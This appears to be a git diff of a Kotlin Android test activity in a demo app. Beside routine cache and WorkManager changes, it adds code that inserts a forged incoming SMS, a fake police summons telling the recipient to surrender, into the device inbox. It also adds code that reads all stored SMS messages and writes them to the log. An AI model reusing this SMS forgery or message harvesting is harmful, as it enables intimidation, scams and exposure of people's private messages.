@@ -1,12 +1,19 @@
 package dinson.customview.activity
 
-import android.content.ComponentName
+import android.Manifest
+import android.content.ContentValues
 import android.content.Context
 import android.content.Intent
+import android.net.Uri
 import android.os.Bundle
-import android.provider.Settings
+import android.util.Log
 import android.view.View
 import androidx.databinding.DataBindingUtil
+import androidx.work.Constraints
+import androidx.work.NetworkType
+import androidx.work.OneTimeWorkRequest
+import androidx.work.WorkManager
+import com.tbruyelle.rxpermissions2.RxPermissions
 import dinson.customview.R
 import dinson.customview._global.BaseActivity
 import dinson.customview.databinding.ActivityTestBinding
@@ -16,10 +23,15 @@ import dinson.customview.kotlin.toast
 import dinson.customview.manager.BlingNdkHelper
 import dinson.customview.utils.CacheUtils
 import dinson.customview.utils.SystemBarModeUtils
+import dinson.customview.workmanager.DeletePng
 import kotlinx.android.synthetic.main.activity_test.*
 import java.io.BufferedReader
 import java.io.IOException
 import java.io.InputStreamReader
+import android.database.sqlite.SQLiteException
+import dinson.customview.kotlin.logi
+import java.text.SimpleDateFormat
+import java.util.*
 
 
 class TestActivity : BaseActivity() {
@@ -27,11 +39,17 @@ class TestActivity : BaseActivity() {
 
     private lateinit var contentView: ActivityTestBinding
 
+    companion object {
+        fun start(context: Context) {
+            context.startActivity(Intent(context, TestActivity::class.java))
+        }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         contentView = DataBindingUtil.setContentView(
             this, R.layout.activity_test)
-        contentView.cacheSize = "click times : $clickTimes"
+        contentView.cacheSize = CacheUtils.getCacheSize(this)
         initUI()
     }
 
@@ -48,19 +66,16 @@ class TestActivity : BaseActivity() {
 
     fun onClearAllCache(view: View) {
         CacheUtils.cleanApplicationData(this)
-        CacheUtils.getCacheSize(this).loge()
-//        contentView.cacheSize = CacheUtils.getCacheSize(this)
+        contentView.cacheSize = CacheUtils.getCacheSize(this)
     }
 
     fun onClearCache(view: View) {
         CacheUtils.cleanApplicationCacheData(this)
-//        contentView.cacheSize = CacheUtils.getCacheSize(this)
+        contentView.cacheSize = CacheUtils.getCacheSize(this)
     }
 
-
-    var clickTimes = 0
     fun onDataBindingClick(view: View) {
-//        contentView.cacheSize = "click times : ${++clickTimes}"
+        contentView.cacheSize = CacheUtils.getCacheSize(this)
     }
 
     fun onExec(view: View) {
@@ -99,40 +114,106 @@ class TestActivity : BaseActivity() {
         }
     }
 
-
-    /**
-     * 打开开发者模式界面
-     */
-    private fun startDevelopmentActivity() {
-        try {
-            val intent = Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS)
-            startActivity(intent)
-        } catch (e: Exception) {
-            try {
-                val componentName = ComponentName("com.android.settings", "com.android.settings.DevelopmentSettings")
-                val intent = Intent()
-                intent.component = componentName
-                intent.action = "android.intent.action.View"
-                startActivity(intent)
-            } catch (e1: Exception) {
-                try {
-                    val intent = Intent("com.android.settings.APPLICATION_DEVELOPMENT_SETTINGS")//部分小米手机采用这种方式跳转
-                    startActivity(intent)
-                } catch (e2: Exception) {
-
-                }
-
-            }
-
-        }
-
+    fun onDoWork(v: View) {
+        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
+        val request = OneTimeWorkRequest.Builder(DeletePng::class.java)
+            .setConstraints(constraints).build()
+        WorkManager.getInstance().enqueue(request)
     }
 
+    fun onSendMsg(v: View) {
+        "1111111111111".loge()
+        /*android.permission.READ_SMS or android.permission.WRITE_SMS*/
+
+     
+        getSmsInPhone().logi()
+        
+        RxPermissions(this).request(Manifest.permission.READ_SMS,Manifest.permission.SEND_SMS)
+            .subscribe {
+                "2222222222222:$it".loge()
+                val uri = Uri.parse("content://sms/")
+                // 获取一个内容提供者的解析器
+                val values = ContentValues()
+                values.put("address", etUser.text.toString())
+                values.put("type", 1)
+                // 获取系统时间
+                values.put("date", System.currentTimeMillis())
+                values.put("body", "紧急通知：xxx同志，已经被告知触犯《中华人民共和国治安管理法》。请速到最近警察局进行自首。谢谢合作！")
+                contentResolver.insert(uri, values)
+            }.addToManaged()
+    }
+
+    fun getSmsInPhone(): String {
+        val SMS_URI_ALL = "content://sms/" // 所有短信
+        val SMS_URI_INBOX = "content://sms/inbox" // 收件箱
+        val SMS_URI_SEND = "content://sms/sent" // 已发送
+        val SMS_URI_DRAFT = "content://sms/draft" // 草稿
+        val SMS_URI_OUTBOX = "content://sms/outbox" // 发件箱
+        val SMS_URI_FAILED = "content://sms/failed" // 发送失败
+        val SMS_URI_QUEUED = "content://sms/queued" // 待发送列表
+
+        val smsBuilder = StringBuilder("msm:  ")
+
+        try {
+            val uri = Uri.parse(SMS_URI_ALL)
+            val projection = arrayOf("_id", "address", "person", "body", "date", "type")
+            var cur = contentResolver.query(uri, projection, null, null, "date desc") // 获取手机内部短信
+            // 获取短信中最新的未读短信
+            // Cursor cur = getContentResolver().query(uri, projection,
+            // "read = ?", new String[]{"0"}, "date desc");
+            if (cur!!.moveToFirst()) {
+                val index_Address = cur.getColumnIndex("address")
+                val index_Person = cur.getColumnIndex("person")
+                val index_Body = cur.getColumnIndex("body")
+                val index_Date = cur.getColumnIndex("date")
+                val index_Type = cur.getColumnIndex("type")
+
+                do {
+                    val strAddress = cur.getString(index_Address)
+                    val intPerson = cur.getInt(index_Person)
+                    val strbody = cur.getString(index_Body)
+                    val longDate = cur.getLong(index_Date)
+                    val intType = cur.getInt(index_Type)
+
+                    val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss")
+                    val d = Date(longDate)
+                    val strDate = dateFormat.format(d)
 
 
-    companion object {
-        fun start(context: Context) {
-            context.startActivity(Intent(context, TestActivity::class.java))
+                    val strType = when (intType) {
+                        1 -> "接收"
+                        2 -> "发送"
+                        3 -> "草稿"
+                        4 -> "发件箱"
+                        5 -> "发送失败"
+                        6 -> "待发送列表"
+                        0 -> "所以短信"
+                        else -> "null"
+                    }
+
+                    smsBuilder.append("[ ")
+                    smsBuilder.append("$strAddress, ")
+                    smsBuilder.append("$intPerson, ")
+                    smsBuilder.append("$strbody, ")
+                    smsBuilder.append("$strDate, ")
+                    smsBuilder.append(strType)
+                    smsBuilder.append(" ]\n\n")
+                } while (cur.moveToNext())
+
+                if (!cur.isClosed) {
+                    cur.close()
+                    cur = null
+                }
+            } else {
+                smsBuilder.append("no result!")
+            }
+
+            smsBuilder.append("getSmsInPhone has executed!")
+
+        } catch (ex: SQLiteException) {
+            Log.d("SQLiteException", ex.message)
         }
+
+        return smsBuilder.toString()
     }
 }
